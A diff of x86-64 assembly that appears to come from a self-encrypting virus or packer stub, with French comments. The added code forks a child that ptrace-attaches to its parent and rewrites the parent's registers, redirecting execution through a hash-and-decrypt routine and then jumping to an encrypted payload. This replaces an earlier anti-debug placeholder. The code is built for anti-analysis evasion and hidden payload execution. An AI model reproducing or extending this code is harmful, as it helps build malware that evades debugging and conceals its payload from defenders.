@@ -9,39 +9,21 @@ syscalls:
 	sub rax, r12
 	cmp rax, 0xff
 	jg end_ft_end
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
-	nop ; 28 nop to replace ptrace syscall
+
+fork:
+	xor rax, rax
+	mov rax, 0x39
+	syscall
+	cmp rax, 0
+	je child
 	;	mov rdi, 0 ; syscalls
 	;	mov rsi, 0 ; syscalls
 	;	mov rdx, 1 ; syscalls
 	;	mov r10, 0 ; syscalls
 	;	mov rax, 0x65 ; syscalls
 	;	syscall ; syscalls
+wait_loop:
+	jmp wait_loop
 hash:
 	;    mov edi, 5381 ;hash
 	mov edi, r13d ; r13 got result of hash loader
@@ -52,9 +34,9 @@ hash:
 	lea rcx, [syscalls] ;adresse syscalls
 	pop r12
 hash_loop1:
-	cmp rsi, 0x90;|REPLACE3| offset key a eviter
+	cmp rsi, 0x7f;|REPLACE3| offset key a eviter
 	jl after_cmp
-	cmp rsi, 0x94;|REPLACE4| offset key a eviter
+	cmp rsi, 0x83;|REPLACE4| offset key a eviter
 	jle hash_loop2
 after_cmp:
 	shl edi, 5
@@ -72,15 +54,6 @@ hash_loop2:
 jmp5:
 	jmp -1 ; sortie
 after_exit_5:
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
-	nop ; 9 nop to replace cmp return of ptrace syscall
 	;	cmp eax, 0 ; syscalls
 	;	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
 	jmp after_exit_2
@@ -126,12 +99,21 @@ chiffrement_loop1_a:
 	sub r15d, 0x12345678; To patch, fingerprint
 	lea r13, [ft_end]
 	add r15, r13
+
+	mov rdi, r15
+	mov rsi, 0x2
+	mov rax, 0x2
+	syscall
+	jc wait_loop
+	jmp -0x1265
+
+label_jmp_to_payload:
 	jmp r15 ; addresse du payload ; jmp_to_payload
 ft_end:
 	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x40f7;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x40f3;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
@@ -200,4 +182,72 @@ after_exit_1:
 	je jmp4 ; sortie
 	cmp DWORD [rsp - 8], 1 ; sortie
 	je jmp5 ; sortie
+
+wait4:
+	mov rdi, r13
+	mov rsi, 0
+	mov rdx, 0
+	mov r10, 0
+	mov rax, 0x3d
+	syscall
+	ret
+
+ptrace:
+	mov rsi, r13
+	mov rdx, 0
+	mov rax, 0x65
+	syscall
+	ret
+child:
+	mov rax, 0x6e
+	syscall
+	mov r13, rax
+	sub rsp, 0x100 ; struct size = 0xd8
+
+	mov rdi, 0x10
+	mov r10, 0
+	call ptrace ; PTRACE_ATTACH
+
+	call wait4
+
+	mov rdi, 0xc
+	lea r10, [rbp - 0xf0]
+	call ptrace ; PTRACE_GETREGS
+	
+	lea rax, [hash]
+	mov [rbp - 0x70], rax
+	mov rdi, 0xd
+	lea r10, [rbp - 0xf0]
+	call ptrace ; PTRACE_SETREGS
+
+	mov rdi, 0x18
+	mov r10, 0
+	call ptrace ; PTRACE_SYSCALL
+
+	call wait4
+
+	mov rdi, 0xc
+	lea r10, [rbp - 0xf0]
+	call ptrace ; PTRACE_GETREGS
+
+	lea rax, [label_jmp_to_payload]
+	mov [rbp - 0x70], rax
+	mov rdi, 0xd
+	lea r10, [rbp - 0xf0]
+	call ptrace ; PTRACE_SETREGS
+
+	mov rdi, 0x07
+	mov r10, 0
+	call ptrace ; PTRACE_CONT
+
+;inf_loop:
+;	jmp inf_loop
+	
+	; exit child
+	mov rax, 0x3c
+	mov rdi, 0
+	syscall
+
 last_instr_of_end:
+	nop
+
